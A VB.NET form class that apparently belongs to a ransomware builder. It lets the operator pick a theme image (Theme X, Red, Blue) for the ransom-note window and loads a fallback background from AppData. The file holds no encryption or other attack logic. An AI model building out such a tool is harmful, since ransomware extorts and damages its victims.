Public Class GuiDesigner

    Private Sub ListBox1_SelectedIndexChanged(sender As System.Object, e As System.EventArgs) Handles ListBox1.SelectedIndexChanged
        Select Case ListBox1.SelectedItem.ToString
            Case "Theme X Design"
                RanForm.Image = My.Resources.themexdesign
            Case "Red x Form"
                RanForm.Image = My.Resources.redxform
            Case "Blue x Form"
                RanForm.Image = My.Resources.bluexform
          
                '615; 633
        End Select
    
    End Sub

    Private Sub GuiDesigner_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Try
            Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & "BackBone.jpg"
            PictureBox2.Image = Image.FromFile(path)
        Catch ex As Exception
            PictureBox2.Image = RasomwareEditor.PictureBox2.Image
        End Try
     
    End Sub
    'nRansomwarex
    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        If ListBox1.SelectedItems.Count = 1 Then
            Select Case ListBox1.SelectedItem.ToString
                Case "Theme X Design"
                    RanForm.Image = My.Resources.themexdesign
                    Form1.colorx = 3
                    Me.Close()
                Case "Red x Form"
                    RanForm.Image = My.Resources.redxform
                    Form1.colorx = 1
                    Me.Close()
                Case "Blue x Form"
                    RanForm.Image = My.Resources.bluexform
                    Form1.colorx = 0
                    Me.Close()


                    '615; 633
            End Select

        Else
            MsgBox("Select Only one ", MsgBoxStyle.Critical)
        End If
    End Sub
End Class